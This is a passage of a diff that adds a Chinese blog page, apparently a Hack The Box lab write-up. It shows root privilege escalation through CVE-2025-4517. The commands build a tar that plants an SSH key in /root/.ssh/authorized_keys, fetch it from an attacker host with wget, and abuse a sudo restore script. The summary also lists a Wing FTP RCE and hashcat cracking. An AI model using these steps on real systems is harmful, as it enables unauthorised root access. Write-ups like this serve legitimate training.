class="hljs-subst">&#123;staging_dir&#125;</span>&quot;</span>)<br><br>    os.makedirs(staging_dir, exist_ok=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(backup_path, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> tar:<br>            tar.extractall(path=staging_dir, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;data&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Extraction completed in <span class="hljs-subst">&#123;staging_dir&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> (tarfile.TarError, OSError, Exception) <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Error during extraction: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
+
+<p>下面这部分代码存在漏洞：CVE-2025-4517</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408204925873.png" srcset="/img/loading.gif" lazyload alt="image-20260408204925873"></p>
+<p>POC：<a target="_blank" rel="noopener" href="https://github.com/DesertDemons/CVE-2025-4138-4517-POC">https://github.com/DesertDemons/CVE-2025-4138-4517-POC</a></p>
+<p>生成 SSH 密钥对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t ed25519 -f id_ed25519 -N <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408211826029.png" srcset="/img/loading.gif" lazyload alt="image-20260408211826029"></p>
+<p>生成 TAR 包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exploit.py --tar-out backup_1001.tar --target /root/.ssh/authorized_keys --payload id_ed25519.pub --mode 0600<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408212118071.png" srcset="/img/loading.gif" lazyload alt="image-20260408212118071"></p>
+<p>本地起一个HTTP服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0:80<br></code></pre></td></tr></table></figure>
+
+<p>在靶机利用<code>wget</code>命令下载文件到<code>/opt/backup_clients/backups/</code>目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/backup_clients/backups/<br>wget http://10.10.16.44/backup_1001.tar<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408210930394.png" srcset="/img/loading.gif" lazyload alt="image-20260408210930394"></p>
+<p>然后执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408211019841.png" srcset="/img/loading.gif" lazyload alt="image-20260408211019841"></p>
+<p>最后就可以登录root用户了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_ed25519 root@10.129.19.187<br></code></pre></td></tr></table></figure>
+
+<p>成功提权</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408212309580.png" srcset="/img/loading.gif" lazyload alt="image-20260408212309580"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408212329276.png" srcset="/img/loading.gif" lazyload alt="image-20260408212329276"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>adfc07dc6844c34130cb6<span class="hljs-number">35f2e73270</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>信息搜集到子域名</li>
+<li>Wing FTP Server v7.4.3 RCE漏洞：CVE-2025-47812</li>
+<li>信息搜集到 wacky 用户的哈希密码，并利用 hashcat 加盐爆破</li>
+<li>利用 sudo 权限配置缺陷和 CVE-2025-4517 提权</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WingData</div>
+      <div>https://yschen20.github.io/2026/04/08/WingData/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Suzen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月8日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年4月8日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/08/%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E6%B5%8B%E8%AF%95/" title="评论功能测试">
+                        <span class="hidden-mobile">评论功能测试</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"yschen20/comments","repo-id":"R_kgDOR8UiJQ","category":"Announcements","category-id":"DIC_kwDOR8UiJc4C6UFx","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("04/25/2025 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
